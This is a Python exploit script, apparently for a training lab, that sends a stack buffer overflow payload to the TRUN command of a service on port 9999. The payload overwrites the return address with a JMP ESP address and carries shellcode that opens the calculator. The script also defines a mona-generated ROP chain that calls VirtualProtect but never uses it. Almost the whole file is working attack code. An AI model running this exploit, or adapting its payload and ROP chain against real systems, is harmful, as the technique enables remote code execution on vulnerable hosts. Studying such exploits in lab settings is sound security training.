#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

SHELL = b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7" # shellcode popping up the calculator


def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        #[---INFO:gadgets_to_set_esi:---]
        0x75c1c022,  # POP EBX # RETN [combase.dll] ** REBASED ** ASLR 
        0x76876164,  # ptr to &VirtualProtect() [IAT ucrtbase.dll] ** REBASED ** ASLR
        0x773c3a91,  # MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ebp:---]
        0x767d809c,  # POP EBP # RETN [ucrtbase.dll] ** REBASED ** ASLR 
        0x767c77c5,  # & push esp # ret  [ucrtbase.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ebx:---]
        0x7704bcd4,  # POP EAX # RETN [msvcp_win.dll] ** REBASED ** ASLR 
        0xfffffdff,  # Value to negate, will become 0x00000201
        0x75a20ce7,  # NEG EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
        0x7677b2d6,  # XCHG EAX,EBX # RETN [ucrtbase.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_edx:---]
        0x75992672,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x75b827dd,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
        0x75b712db,  # XCHG EAX,EDX # RETN [combase.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ecx:---]
        0x75b6a3f9,  # POP ECX # RETN [combase.dll] ** REBASED ** ASLR 
        0x6250407e,  # &Writable location [Essfun.dll]
        #[---INFO:gadgets_to_set_edi:---]
        0x77d9e72c,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x774377c7,  # RETN (ROP NOP) [WS2_32.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        0x76828c7b,  # POP EAX # RETN [ucrtbase.dll] ** REBASED ** ASLR 
        0x90909090,  # nop
        #[---INFO:pushad:---]
        0x77392bb0,  # PUSHAD # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

PAYLOAD = (
    b'TRUN /.:/' +
    b'A' * 1995 +
    # JMP ESP
    struct.pack('<L', 0x625026D3) +
    SHELL +
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
